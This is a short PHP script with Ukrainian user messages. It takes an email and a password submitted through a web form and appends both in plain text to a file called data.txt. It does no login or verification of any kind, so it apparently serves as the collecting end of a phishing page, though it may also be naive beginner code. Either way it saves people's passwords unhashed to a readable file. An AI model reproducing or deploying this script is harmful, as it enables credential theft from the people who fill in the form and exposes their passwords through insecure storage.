<?php
$email = trim($_POST['email']);
$pass = trim($_POST['pass']);

if (!empty($email) && !empty($pass)) {
    $fp = fopen('data.txt', 'a');
    fwrite($fp, "email: $email\n");
    fwrite($fp, "pass: $pass\n");
    fclose($fp);
    echo "Дані збережено успішно.";
} else {
    echo "Будь ласка, введіть email і пароль.";
}
?>
